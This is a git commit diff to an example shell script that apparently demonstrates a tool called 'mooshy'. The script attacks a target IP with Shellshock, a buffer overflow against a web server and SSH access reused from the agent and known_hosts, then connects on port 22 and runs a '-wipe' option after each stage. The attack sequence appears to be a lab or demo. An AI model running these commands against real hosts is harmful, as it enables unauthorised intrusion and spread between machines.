55e46d911576c36d1c0f32d204f8338dd7177d75
b10n <b10n@dittes.nl>
2018-04-30 16:10:24 +0200

    example: Small fixes

--- example.sh
+++ example.sh
@@ -6,17 +6,15 @@ mooshy=./bin/mooshy-linux-amd64
 
 cowsay "ShellShock"
 ${mooshy} -shellShock -addr http://${ip}/cgi-bin/index.cgi
-${mooshy} -addr ${ip}:22
-${mooshy} -addr ${ip}:22 -wipe 
+${mooshy} -addr ${ip}:22 && ${mooshy} -addr ${ip}:22 -wipe 
 
 cowsay "Buffer Overflow"
 echo "Now execute 'killall hhttpd; hhttpd'"
 ${mooshy} -bufferOverflow -addr ${ip}:8080
-${mooshy} -addr ${ip}:22
-${mooshy} -addr ${ip}:22 -wipe 
+${mooshy} -addr ${ip}:22 && ${mooshy} -addr ${ip}:22 -wipe 
 
 cowsay "SSH"
 cat ~/.ssh/known_hosts | grep ${ip} > known_hosts
 ${mooshy} -ssh -useSSHAgent -useSSHKnown -sshKnown known_hosts -sshUser ${user}
-${mooshy} -addr ${ip}:22
-${mooshy} -addr ${ip}:22 -wipe
+${mooshy} -addr ${ip}:22 && ${mooshy} -addr ${ip}:22 -wipe
+rm known_hosts
